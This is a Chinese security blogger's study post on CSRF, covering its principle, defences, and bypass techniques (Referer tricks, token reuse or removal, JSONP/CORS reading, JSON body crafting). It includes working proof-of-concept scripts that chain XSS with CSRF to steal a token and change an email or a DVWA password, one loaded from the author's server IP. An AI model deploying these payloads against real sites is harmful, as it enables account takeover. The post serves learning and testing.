@@ -1,0 +1,487 @@
+<head>
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+<script src="https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget/autoload.js"></script>
+</head>
+
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+<head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="ggy的个人博客">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.2.3">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="https://ggyggy666.github.io">
+    <!--SEO-->
+
+<meta name="keywords" content="CSRF的常见情况及绕过姿势" />
+
+
+<meta name="description" content="今天学习CSRF漏洞。
+
+漏洞原理CSRF，跨站请求伪造，简单来讲，就是用户登录一个网站后，还没退出的时候，在同一个浏览器中点开了一个攻击者发送过来的恶意链接，导致用户在不知情的情况下执行了某些..." />
+
+
+<meta name="robots" content="all" />
+<meta name="google" content="all" />
+<meta name="googlebot" content="all" />
+<meta name="verify" content="all" />
+    <!--Title-->
+
+<title>
+    
+    CSRF的常见情况及绕过姿势 |
+    
+    ggy的个人博客
+</title>
+
+<link rel="alternate" href="/atom.xml" title="ggy的个人博客" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+<div class="hide">
+    <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+    document.write(unescape("%3Cspan class='cnzz_stat_icon_1263868967 hide' %3E%3Cscript%20src%3D%22https%3A%2F%2Fs95.cnzz.com%2Fz_stat.php%3Fweb_id%3D1272564536%22%3E%3C%2Fscript%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s19.cnzz.com/z_stat.php%3Fid%3D1263868967%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script>
+</div>
+
+
+
+
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header"  style="background-image:url(
+    https://pic.downk.cc/item/5e3816b82fb38b8c3c8791f9.jpg)"
+     >
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title='ggy'>
+            <img src="/img/avatar.jpg" alt="logo头像" class="img-responsive center-block">
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">Snippet主题,从未如此简单有趣</h2>-->
+            
+            <h2>
+                欢迎来到ggy的个人网站
+            </h2>
+            
+        </div>
+    </div>
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="https://ggyggy666.github.io">
+                        ggy的个人博客</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                首页</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/web安全/"><i class="fa "></i>
+                                web安全</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/python工具/"><i class="fa "></i>
+                                python工具</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/密码学/"><i class="fa "></i>
+                                密码学</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                时间轴</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="CSRF的常见情况及绕过姿势">
+            
+            CSRF的常见情况及绕过姿势
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-link" href="/tags/CSRF%E7%9A%84%E5%B8%B8%E8%A7%81%E6%83%85%E5%86%B5%E5%8F%8A%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" rel="tag">CSRF的常见情况及绕过姿势</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2020/06/25</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p>今天学习CSRF漏洞。</p>
+<a id="more"></a>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>CSRF，跨站请求伪造，简单来讲，就是用户登录一个网站后，还没退出的时候，在同一个浏览器中点开了一个攻击者发送过来的恶意链接，导致用户在不知情的情况下执行了某些操作。这个漏洞利用的就是用户自己的身份，攻击者并不能登录该用户。</p>
+<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><p>分为GET型和POST型。GET型只需要将执行那个操作的链接发送给受害者即可。POST还要用burp生成poc，放到自己的公网服务器上才能让用户点击访问到。<br>但如果发现是POST型的，也可以试试用burp转变成GET型请求再去访问。因为可能后台接收是使用$_REQUEST,可以接收GET、POST。</p>
+<h2 id="验证方法"><a href="#验证方法" class="headerlink" title="验证方法"></a>验证方法</h2><p>最好用两个账号在两个浏览器测试。不然可能token绑定了账号，自己的账号可以进行CSRF，但换一个就不行了。（之前美团遇到的）</p>
+<h2 id="常见防御"><a href="#常见防御" class="headerlink" title="常见防御"></a>常见防御</h2><ol>
+<li>验证referer。</li>
+<li>使用csrf-token。</li>
+<li>使用验证码。</li>
+<li>使用JSON传输数据，并且验证了content-type。</li>
+</ol>
+<h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><ol>
+<li><p>存在referer：</p>
+<ul>
+<li>删除掉它，看回显的差异。</li>
+<li>看是只判断了域名还是整个链接。如果只是判断了域名如baidu.com，可以找其它子域名然后发布攻击页面的那个链接。</li>
+<li>可以找一个该网站的URL跳转漏洞。</li>
+<li>如果只是判断了本网站的hostname，即完整的：<code>www.baidu.com</code>。但是没有判断它的位置，可以在自己服务器上新建一个文件，名字就叫：<code>www.baidu.com</code>，然后在该目录下新建文件，写入POC,就可以构造出：<code>http://118.179.88.139/www.baidu.com/csrf.html</code>。当然，也可以是那个文件名字叫域名即：<code>www.baidu.com.html</code>。burp也是可以生成POC的，只不过是要增加一个referer在开头的history.pushState中,这样就能带着特定的referer去访问了：</li>
+</ul>
+<p><img src="https://pic.downk.cc/item/5ef710d514195aa5944c6b3c.jpg" alt></p>
+</li>
+<li><p>存在token。</p>
+<ul>
+<li>使用xss获取token，具体看后面的内容。</li>
+<li>测试token，看是否是真的随机，或者能否重用。</li>
+<li>POST中的token，修改值会报错，但可以试着转换成GET型的，可能没有验证。</li>
+<li>token存在时就验证，不存在时就不验证。因此可以试试删除整个token参数和值。    </li>
+<li>如果token没有绑定账号（用户会话），可以试试自己的账号的token直接生成POC。注册两个账号，一个生成POC后在另一个账号所在浏览器打开。</li>
+<li>如果token没有绑定session会话，即csrftoken出现在cookie中，那么可以在一个账号中试一下，抓包后，修改cookie的值，导致会话注销，退出登录；但只修改token的值，只会拒绝token而不会退出，说明token没有严格绑定到会话。然后使用另一个账号，将一个账号的csrftoken值复制替换另一个账号的，观察是否正常执行（cookie里的和POST数据里的都要一起替换）。但是正常情况下生成的POC无法设置cookie从而替换，因此需要在页面找一下能set-Cookie的地方。比如搜索框中，输入一个test，然后在repeater中点击go，回显中存在set-Cookie，并且我们的输入也在里面。而且还需要CRLF注入，使用%0a%0d。构造POC的时候,使用img标签的src属性去加载那个注入cookie的URL，然后由于不是图片肯定会出错，触发onerror事件从而提交表单。条件太多，太难利用了。因此最好还是找个xss，然后用Ajax。</li>
+<li>如果token同时出现在了cookie和POST数据中，并且如果他们的值都是一样的，那么很可能只是验证了传入的值和cookie中的值是否一样。利用方法跟上一个一样，只是将token值换成一样的。</li>
+</ul>
+</li>
+</ol>
+<p><img src="https://pic.downk.cc/item/5ef710b614195aa5944c5c39.jpg" alt></p>
+<h2 id="读取JSON格式的数据"><a href="#读取JSON格式的数据" class="headerlink" title="读取JSON格式的数据"></a>读取JSON格式的数据</h2><p>主要有JSONP和CORS跨域读取。</p>
+<h3 id="JSONP绕过。"><a href="#JSONP绕过。" class="headerlink" title="JSONP绕过。"></a>JSONP绕过。</h3><p>JSONP的介绍：<a href="https://blog.csdn.net/hansexploration/article/details/80314948" target="_blank" rel="noopener">https://blog.csdn.net/hansexploration/article/details/80314948</a><br>AJax无法跨域传输接收数据，但是js文件可以。JSON格式恰好被js支持，因此JSON格式的文件也是可以跨域的。加载跨域文件涉及到src属性，script,iframe,img都有。使用script标签，src加载远程JSON文件，同时传输一个callback的函数名进去，将JSON数据用（）包裹起来作为参数，方便处理数据。</p>
+<p>JSONP绕过可以看这篇文章：<br><a href="https://xz.aliyun.com/t/5143" target="_blank" rel="noopener">https://xz.aliyun.com/t/5143</a><br>DoraBox有个靶场。<strong>利用的POC</strong>是在：<a href="http://118.178.88.139/csrfJson.php。" target="_blank" rel="noopener">http://118.178.88.139/csrfJson.php。</a></p>
+<h3 id="CORS跨域"><a href="#CORS跨域" class="headerlink" title="CORS跨域"></a>CORS跨域</h3><p>首先，访问页面的时候需要看返回包中是否有一串JSON格式的数据，而且返回包的header中可能有：</p>
+<pre><code>Access-Control-Allow-Origin: *
+Access-Control-Allow-Headers: X-Requested-With
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: PUT,POST,GET,DELETE,OPTIONS</code></pre><p>第一个和第三个是必需的。*表示允许接收所有域，也可能是null或者特定域。</p>
+<p>之后需要验证是否能跨域读取数据。打开phpstudy环境，访问：<a href="http://localhost:999/cors/cors/ContentHijackingLoader.html" target="_blank" rel="noopener">http://localhost:999/cors/cors/ContentHijackingLoader.html</a><br>然后在：Target Page中填入目标链接。Type选择CORS iframe或者CORS Window。如果是POST型，还需要在POST Data里填入数据。之后直接点击Retrieve Contents，如果返回了JSON格式的数据，说明存在。但这只是验证存在，利用的话还需要额外写POC。<strong>POC在</strong>：<a href="http://118.178.88.139/cors.php" target="_blank" rel="noopener">http://118.178.88.139/cors.php</a></p>
+<h2 id="JSON格式传输数据应对方法"><a href="#JSON格式传输数据应对方法" class="headerlink" title="JSON格式传输数据应对方法"></a>JSON格式传输数据应对方法</h2><ol>
+<li><p>常规方法：将json格式的数据放在input标签的name中，然后form标签中需要有：enctype=”text/plain”。但是要解析JSON格式的话，Content-Type须为：application/json。而form表单无法设置enctype=”application/json”,只能寄希望于服务器能解析。因此测试是否可以构造poc时，首先可以<strong>在原来的请求页面将Content-Type改为：text/plain，看是否还能正确回显</strong>。如果可以，就可以使用常规方法了。</p>
+</li>
+<li><p>如果不行，可以对每一个键值对都使用一个input标签。键为name值，值就是value的值。不需要form中的enctype。<br>参考文章：<a href="https://xz.aliyun.com/t/6052" target="_blank" rel="noopener">https://xz.aliyun.com/t/6052</a></p>
+</li>
+<li><p>如果服务端没有验证传输进来的Content-type是否为：application/json, 可以试试用Ajax传输。可以自己设置Header，也就能设置Content-Type为application/json,就可以跨域。</p>
+<pre><code>&lt;html&gt;
+  &lt;body&gt;
+&lt;script&gt;
+  function submitRequest()
+  {
+var xhr = new XMLHttpRequest();
+xhr.open(&quot;POST&quot;, &quot;http://www.xxx.com/webnet/edit&quot;, true);
+xhr.setRequestHeader(&quot;Accept&quot;, &quot;*/*&quot;);
+xhr.setRequestHeader(&quot;Accept-Language&quot;, &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;);
+xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/json; charset=utf-8&quot;);
+xhr.withCredentials = true;
+xhr.send(JSON.stringify({&quot;pSpotId&quot;:&quot;120201&quot;,&quot;pSignTimes&quot;:&quot;70&quot;,&quot;pModuleID&quot;:&quot;207&quot;,&quot;pSceneid&quot;:&quot;120201007000046&quot;});
+}
+&lt;/script&gt;
+&lt;form action=&quot;#&quot;&gt;
+  &lt;input type=&quot;button&quot; value=&quot;Submit request&quot; onclick=&quot;submitRequest();&quot;/&gt;
+&lt;/form&gt;
+ &lt;/body&gt;
+&lt;/html&gt;</code></pre></li>
+</ol>
+<p>但如果验证了不能为：application/json,或者说会将application/json转变成其它的， 就只能用text/plain,由于CORS策略我们不能这样传输了，除非服务器允许超过自定义的Origin和在响应中为Access-Control-Allow-Credentials：true。并且没有其它防御措施。（如果限制死了不能跨域，那么放在我们服务器上的POC文件就无法成功跨域执行。我想，应该可以在同一个域中找个上传点能上传HTML文件的。）<br>4. JSON格式的闭合：首先正常的burp生成POC，然后浏览器打开，点击提交时抓包，如果看到POST传输的数据中是：<br>    <code>{&quot;appId&quot;:&quot;300016001555&quot;,&quot;appName&quot;:&quot;0xdawnnn&quot;}=</code><br>由于多了一个=，如果直接把这些JSON格式数据放在input中的name里，服务器是无法解析的。因此需要构造：<br>    <code>&lt;input type=&quot;hidden&quot; name=&#39;{&quot;appId&quot;:&quot;300016001555&quot;,&quot;appName&quot;:&quot;0xdawnnn&quot;,&quot;test&quot;:&quot;&#39; value=&#39;test&quot;}&#39; /&gt;</code><br>test属性和值都是自己加的。<br>5. 由于flash就要不支持了，所以flash的绕过不学了。</p>
+<p>具体参考：<a href="https://xz.aliyun.com/t/7911" target="_blank" rel="noopener">https://xz.aliyun.com/t/7911</a></p>
+<h2 id="XSS与CSRF组合"><a href="#XSS与CSRF组合" class="headerlink" title="XSS与CSRF组合"></a>XSS与CSRF组合</h2><ol>
+<li>对于一个self-xss，可以看该处是否还存在CSRF。填入xss的payload后，抓包生成POC，浏览器打开。</li>
+<li>利用XSS执行CSRF。XSS的payload可以是script标签，那么就可以在script标签的内容里构造Ajax请求，去执行相应地方的CSRF。此时，不会受到同源限制。如果那个CSRF的地方有token，那么可以先获得token，然后发送Ajax。</li>
+</ol>
+<pre><code>var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open(&apos;get&apos;,&apos;/email&apos;,true);
+req.send();
+function handleResponse() {
+var token = this.responseText.match(/name=&quot;csrf&quot; value=&quot;(\w+)&quot;/)[1];
+var changeReq = new XMLHttpRequest();
+changeReq.open(&apos;post&apos;, &apos;/email/change-email&apos;, true);
+changeReq.send(&apos;csrf=&apos;+token+&apos;&amp;email=test@test.com&apos;)
+};</code></pre><h2 id="dvwa的high等级"><a href="#dvwa的high等级" class="headerlink" title="dvwa的high等级"></a>dvwa的high等级</h2><p>这是GET型的，如果没有同源策略，payload应该是：</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head lang=&quot;en&quot;&gt;
+&lt;meta charset=&quot;UTF-8&quot;&gt;
+&lt;title&gt;&lt;/title&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+    //获取用户的token，并设置为表单中的token，然后提交修改密码的表单
+    function attack()
+    {
+        document.getElementsByName(&apos;user_token&apos;)[0].value=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(&apos;user_token&apos;)[0].value;
+        document.getElementById(&quot;transfer&quot;).submit();
+    }
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body onload=&quot;attack()&quot;&gt;
+&lt;ifram src=&quot;http://192.168.10.14/dvwa/vulnerabilities/csrf/&quot; id=&quot;hack&quot;  style=&quot;display:none;&quot;&gt;  &lt;!--在该网页内打开另一个网页--&gt;
+&lt;/ifram&gt;
+&lt;form method=&quot;GET&quot; id=&quot;transfer&quot;  action=&quot;http://192.168.10.14/dvwa/vulnerabilities/csrf/&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;admin&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;admin&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><p>但是有同源策略，就只能用xss了。弹出token：</p>
+<pre><code>&lt;ifram src=&quot;../csrf/&quot; onload=alert(frames[0].document.getElementsByName(&apos;user_token&apos;)[0].value)&gt;&lt;/ifram&gt;</code></pre><p>不过弹出token也没啥用，最后还是得用上面的xss与CSRF的POC（要修改）。如下：</p>
+<pre><code>var f = document.createElement(&quot;ifram&quot;);
+f.src = &quot;http://localhost:999/dvwa/vulnerabilities/csrf/&quot;;
+f.style = &quot;opacity:0&quot;;
+f.onload = handleResponse;
+document.body.appendChild(f);
+function handleResponse(){
+    var token = frames[0].document.getElementsByName(&apos;user_token&apos;)[0].value;
+    var changeReq = new XMLHttpRequest();
+    changeReq.open(&apos;get&apos;, &apos;http://localhost:999/dvwa/vulnerabilities/csrf/?password_new=admin&amp;password_conf=admin&amp;Change=Change&amp;user_token=&apos;+token, true);
+    changeReq.send();
+}</code></pre><p>保存在服务器中了。只需要xss漏洞中使用：<code>&lt;script src=&quot;http://118.178.88.139/dvwaCsrf.js&quot;&gt;&lt;/script&gt;</code> 注意必须使用document.body.appendChild(f)将iframe标签加入body的DOM结构中。</p>
+<h2 id="注意，由于防止代码被执行，iframe变成了ifram"><a href="#注意，由于防止代码被执行，iframe变成了ifram" class="headerlink" title="注意，由于防止代码被执行，iframe变成了ifram"></a>注意，由于防止代码被执行，iframe变成了ifram</h2>
+    </div>
+    
+    <div class="reward" ontouchstart>
+    <div class="reward-wrap">赏
+        <div class="reward-box">
+            
+            <span class="reward-type">
+                <img class="alipay" src="/img/alipay.jpg"><b>支付宝打赏</b>
+            </span>
+            
+            
+            <span class="reward-type">
+                <img class="wechat" src="/img/wechat.jpg"><b>微信打赏</b>
+            </span>
+            
+        </div>
+    </div>
+    <p class="reward-tip">
+        赞赏是不耍流氓的鼓励
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="ggy.44pp.vip" target="_blank">ggy</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/2020/07/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="pre-post btn btn-default" title='文件上传漏洞总结'>
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            文件上传漏洞总结</span>
+    </a>
+    
+    
+    <a href="/2020/06/24/SSRF%E7%9A%84%E5%B8%B8%E8%A7%81%E6%83%85%E5%86%B5%E5%8F%8A%E7%BB%95%E8%BF%87%E7%AD%89/" class="next-post btn btn-default" title='SSRF的常见情况及绕过等'>
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            SSRF的常见情况及绕过等</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<div id="lv-container" data-id="city" data-uid="MTAyMC80ODM1Ni8yNDg1MA==">
+    <script type="text/javascript">
+    (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+    })(document, 'script');
+    </script>
+</div>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            文章目录
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#类型"><span class="toc-text">类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#验证方法"><span class="toc-text">验证方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常见防御"><span class="toc-text">常见防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过姿势"><span class="toc-text">绕过姿势</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#读取JSON格式的数据"><span class="toc-text">读取JSON格式的数据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JSONP绕过。"><span class="toc-text">JSONP绕过。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CORS跨域"><span class="toc-text">CORS跨域</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSON格式传输数据应对方法"><span class="toc-text">JSON格式传输数据应对方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS与CSRF组合"><span class="toc-text">XSS与CSRF组合</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dvwa的high等级"><span class="toc-text">dvwa的high等级</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注意，由于防止代码被执行，iframe变成了ifram"><span class="toc-text">注意，由于防止代码被执行，iframe变成了ifram</span></a></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    访问量:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    &nbsp; | &nbsp;
+    访客数:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright &copy;
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//hexo.io" class="copyright-links" target="_blank" rel="nofollow">Hexo</a>
+                </span> |
+                <span>
+                    Theme by <a href="//github.com/shenliyang/hexo-theme-snippet.git" class="copyright-links" target="_blank" rel="nofollow">Snippet</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="/assets/tagcanvas.min.js?rev=2.9.js"></script>
+
+<script>
+var tagOption = {
+    textColour: '#444', // 字体颜色
+    outlineMethod: 'block', // 选中模式
+    outlineColour: '#FFDAB9', // 选中模式的颜色
+    interval: 30 || 30, // 动画帧之间的时间间隔，值越大，转动幅度越大
+    textHeight: 13,
+    outlineRadius: 3,
+    freezeActive: true || '', // 选中的标签是否继续滚动
+    frontSelect: true || '', // 不选标签云后部的标签
+    initial: [0.1, -0.1],
+    depth: 0.5,
+    decel: 0.95,
+    maxSpeed: 0.03,
+    reverse: true || '', // 是否反向触发
+    fadeIn: 500, // 进入动画时间
+    wheelZoom: false || '' // 是否启用鼠标滚轮
+}
+TagCanvas.Start('tag-cloud-3d', '', tagOption);
+</script>
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+<!-- 雪花特效 -->
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<script type="text/javascript" src="\js\snow.js"></script>
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"live2d-widget-model-haruto"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
